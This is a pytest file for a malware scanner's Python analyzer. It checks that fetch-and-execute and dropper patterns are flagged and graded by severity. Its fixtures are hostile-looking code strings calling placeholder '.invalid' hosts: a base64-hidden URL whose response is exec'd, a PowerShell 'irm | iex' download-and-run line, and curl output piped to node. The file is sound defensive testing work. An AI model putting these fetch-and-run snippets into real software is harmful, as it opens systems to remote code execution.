"""Where the code a Python file runs comes from (`analysis/python/sourced_flows.py`), and the dropper
it lowers when nothing fetched or decoded reaches what runs (`CompositeGrading`, unsourced code).

Every source is written fresh for the test; hosts are under `.invalid` and nothing here is run.
"""

from __future__ import annotations

from typing import ClassVar

from cordon_scanner.analysis.python.pyast import PythonAnalyzer
from cordon_scanner.detect.base import FileUnit, ScanContext
from cordon_scanner.detect.code.capability.detector import CapabilityDetector
from cordon_scanner.foundation.capabilities import Capability
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.content import FileContent
from cordon_scanner.foundation.models import Severity
from cordon_scanner.rules.loader import RuleLoader, RuleSet


class FlowKit:
    LOCAL_VERSION: ClassVar[str] = (
        "import os, base64, requests\n"
        "index = requests.get('https://index.invalid/simple/', timeout=5).text\n"
        "v = {}\n"
        "with open(os.path.join(os.path.dirname(__file__), 'version.py')) as fp:\n"
        "    exec(fp.read(), v)\n"
        "token = base64.b64decode(os.environ.get('TOKEN', ''))\n"
    )
    FETCHED_MODULE: ClassVar[str] = (
        "import base64, types, urllib.request\n"
        "with urllib.request.urlopen(base64.b64decode('aHR0cHM6Ly94LmludmFsaWQv').decode()) as resp:\n"
        "    module = types.ModuleType('checker')\n"
        "    exec(resp.read(), module.__dict__)\n"
    )

    @staticmethod
    def fetch_exec(source: str) -> list[int]:
        return [
            h.line for h in PythonAnalyzer.analyse(source) if h.capability is Capability.FETCH_EXEC
        ]

    @staticmethod
    def dropper(source: str) -> list[Severity]:
        unit = FileUnit(
            content=FileContent.from_bytes("pkg/__init__.py", source.encode()), language="python"
        )
        ctx = ScanContext(config=Config.default(), rules=RuleSet(RuleLoader.load_builtin()))
        return [
            f.severity
            for f in CapabilityDetector().inspect(unit, ctx)
            if f.rule_id == "SUSPECT.DROPPER.001"
        ]


class TestNetworkFlowsThroughEveryBinding:
    def test_a_module_fetched_in_a_with_block_and_run(self) -> None:
        assert FlowKit.fetch_exec(FlowKit.FETCHED_MODULE) == [4]

    def test_a_for_target_over_a_response(self) -> None:
        source = (
            "import urllib.request\n"
            "for line in urllib.request.urlopen('https://x.invalid/c'):\n"
            "    exec(line)\n"
        )
        assert FlowKit.fetch_exec(source) == [3]

    def test_a_shell_handed_a_download_piped_into_it(self) -> None:
        source = (
            "import subprocess\n"
            "subprocess.run(['powershell', '-NoExit', '-Command', 'irm https://x.invalid/a | iex'])\n"
        )
        assert FlowKit.fetch_exec(source) == [2]

    def test_an_interpreter_given_what_a_download_printed(self) -> None:
        source = (
            "import subprocess\n"
            "r = subprocess.run(['curl', '-s', 'https://x.invalid/a'], capture_output=True, text=True)\n"
            "subprocess.run(['node', '-e', r.stdout])\n"
        )
        assert FlowKit.fetch_exec(source) == [3]

    def test_an_argument_list_naming_a_program_passes_data(self) -> None:
        source = (
            "import subprocess, requests\n"
            "sha = requests.get('https://x.invalid/sha').text\n"
            "subprocess.run(['git', 'checkout', sha])\n"
        )
        assert FlowKit.fetch_exec(source) == []


class TestWhatASinkIsHanded:
    def test_a_local_file_and_a_setting_are_not_sourced(self) -> None:
        every, sourced = PythonAnalyzer.sink_sources(
            "import os\nexec(open('version.py').read(), {})\nx = eval(os.environ.get('W', '0.8'))\n"
        ) or (frozenset(), frozenset())
        assert every == {2, 3} and sourced == set()

    def test_fetched_decoded_and_parameter_fed_sinks_are_sourced(self) -> None:
        found = PythonAnalyzer.sink_sources(
            "import base64, pickle, requests\n"
            "exec(requests.get('https://x.invalid').text)\n"
            "pickle.loads(base64.b64decode(BLOB))\n"
            "def run(code):\n"
            "    exec(code)\n"
        )
        assert found is not None and found[1] == {2, 3, 5}

    def test_a_file_that_does_not_parse_says_nothing(self) -> None:
        assert PythonAnalyzer.sink_sources("def broken(:\n") is None


class TestTheDropperLowersOnlyWhatNothingFetchedReaches:
    def test_a_local_version_file_run_beside_a_request_is_lowered(self) -> None:
        assert FlowKit.dropper(FlowKit.LOCAL_VERSION) == [Severity.MEDIUM]

    def test_a_fetched_module_run_still_blocks(self) -> None:
        assert FlowKit.dropper(FlowKit.FETCHED_MODULE) == [Severity.HIGH]

    def test_decoded_code_run_beside_a_request_still_blocks(self) -> None:
        source = (
            "import base64, requests\n"
            "requests.get('https://x.invalid/ping')\n"
            "exec(base64.b64decode(BLOB))\n"
        )
        assert FlowKit.dropper(source) == [Severity.HIGH]
